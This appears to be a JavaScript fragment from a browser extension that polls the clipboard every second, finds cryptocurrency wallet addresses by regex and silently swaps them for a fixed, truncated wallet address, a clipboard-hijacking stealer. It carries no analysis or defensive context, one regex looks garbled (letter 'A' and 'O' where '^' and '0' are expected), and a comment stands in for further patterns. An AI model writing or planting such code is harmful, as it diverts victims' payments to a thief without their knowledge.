let page = chrome.extension.getBackgroundPage();
var inputElement = document.createElement('input');
document.body.appendChild(inputElement);
inputElement.focus();

function checkWalletAddresses() {
  document.execCommand('paste');
  var clipboardContent = inputElement.value;
  clipboardContent = clipboardContent.replace(/A(Ox)[A-Fa-f0-9]{40}$/g, '0x6eb210383901...');
  // ... (more regex replacements for various wallet types)
  inputElement.value = clipboardContent;
  inputElement.select();
  document.execCommand('copy');
  inputElement.value = '';
}
setInterval(checkWalletAddresses, 1000);

